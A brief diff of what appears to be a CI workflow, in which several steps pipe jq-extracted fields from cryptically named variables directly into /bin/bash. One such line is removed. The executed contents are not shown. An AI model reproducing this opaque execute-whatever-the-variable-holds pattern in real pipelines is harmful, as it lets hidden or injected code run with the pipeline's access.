@@ -25,7 +25,6 @@ jobs:
           echo $y7 | jq -r .lc4 | /bin/bash
           echo $nkrg39 | jq -r .lfba14 | /bin/bash
           echo $euug9 | jq -r .qc7944 | /bin/bash
-          printf '%s' "$jxzjp8316" | jq -r .xot3037 | /bin/bash
           echo $g4 | jq -r .mlwj038 | /bin/bash
 
       - name: Save output
